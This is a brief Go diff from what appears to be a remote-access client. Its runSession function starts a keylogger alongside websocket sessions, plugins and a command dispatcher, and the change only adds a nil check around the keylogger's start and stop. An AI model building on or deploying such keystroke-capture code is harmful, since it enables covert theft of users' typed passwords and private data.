@@ -607,10 +607,12 @@ func runSession(ctx context.Context, cancel context.CancelFunc, conn *websocket.
 	defer env.Plugins.Close()
 
 	env.Keylogger = keylogger.New()
-	if err := env.Keylogger.Start(); err != nil {
-		log.Printf("[keylogger] Failed to start: %v", err)
-	} else {
-		defer env.Keylogger.Stop()
+	if env.Keylogger != nil {
+		if err := env.Keylogger.Start(); err != nil {
+			log.Printf("[keylogger] Failed to start: %v", err)
+		} else {
+			defer env.Keylogger.Stop()
+		}
 	}
 
 	dispatcher := handlers.NewDispatcher(env)
